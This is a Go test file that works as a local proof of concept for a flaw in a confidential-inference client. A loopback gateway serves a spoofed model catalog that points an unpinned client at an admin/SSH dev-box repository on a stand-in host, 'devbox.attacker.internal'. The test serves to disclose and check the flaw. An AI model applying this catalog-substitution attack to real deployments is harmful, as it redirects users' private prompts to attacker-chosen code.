package tinfoil

// PoC (local only): the gateway catalog is unauthenticated and may name ANY
// tinfoilsh/* repository for a model. A client built with NewGateway (the
// tinfoil-proxy / confidential-openai-adapter default: no --pin) then verifies
// the replica against that repository, e.g. Tinfoil's cvm_admin+SSH dev-box
// image, and seals the user's prompts to it.

import (
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/stretchr/testify/require"
	"github.com/tinfoilsh/tinfoil-go/enclave"
)

func TestPoC_GatewayCatalogSelectsDevBoxRepo(t *testing.T) {
	const model = "llama3-3-70b"
	const evilRepo = "tinfoilsh/confidential-ubuntu-tinfoil-config" // cvm_admin: true, sshd on 22, Tinfoil-staff keys
	const evilHost = "devbox.attacker.internal"

	// Loopback "gateway" that serves an attacker-chosen catalog.
	gateway := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/catalog" {
			http.NotFound(w, r)
			return
		}
		_ = json.NewEncoder(w).Encode(map[string]any{
			model: map[string]any{"repo": evilRepo, "hosts": []string{evilHost}},
		})
	}))
	defer gateway.Close()

	// FetchCatalog uses http.DefaultTransport with WebPKI validation; trust the
	// loopback CA for this test (the real gateway has a real certificate).
	pool := x509.NewCertPool()
	pool.AddCert(gateway.Certificate())
	defaultTransport := http.DefaultTransport.(*http.Transport)
	saved := defaultTransport.TLSClientConfig
	defaultTransport.TLSClientConfig = &tls.Config{RootCAs: pool}
	defer func() { defaultTransport.TLSClientConfig = saved }()

	host := gateway.Listener.Addr().String()
	catalog, err := FetchCatalog(host)
	require.NoError(t, err)
	entry, ok := catalog[model]
	require.True(t, ok, "catalog entry naming a dev-box repo must survive FetchCatalog's filter")
	t.Logf("FetchCatalog kept: model=%s repo=%s hosts=%v (trusted()=%v)", model, entry.Repo, entry.Hosts, entry.trusted())

	// Default gateway policy (no pins) resolves the model to the attacker's repo.
	policy, err := newGatewayPolicy(GatewayOptions{}, enclave.Options{})
	require.NoError(t, err)
	hosts, replica, err := policy.resolve(model, catalog)
	require.NoError(t, err)
	t.Logf("gatewayPolicy.resolve: hosts=%v replica.ref=%q", hosts, replica.ref)
	require.Equal(t, evilRepo, replica.ref)

	// NewGateway (as tinfoil-proxy/adapter call it) accepts the catalog and
	// builds an enclave handle bound to that repository.
	gw, err := NewGateway(gateway.URL+"/v1/", nil, GatewayOptions{})
	require.NoError(t, err)
	require.True(t, gw.Serves(model))
	handle, err := enclave.NewHandle(evilHost, replica.ref, &policy.defaults)
	require.NoError(t, err)
	t.Logf("enclave.Handle for %s will run verify.VerifyV3(doc, nonce, %q): the SAN regex becomes ^https://github\\.com/%s/\\.github/workflows/[^/@]+@refs/tags/[^@]+$", handle.Enclave(), handle.Repo(), evilRepo)
	t.Logf("VULNERABLE: an unpinned NewGateway client lets the gateway pick which tinfoilsh/* code it must trust for %q", model)
}
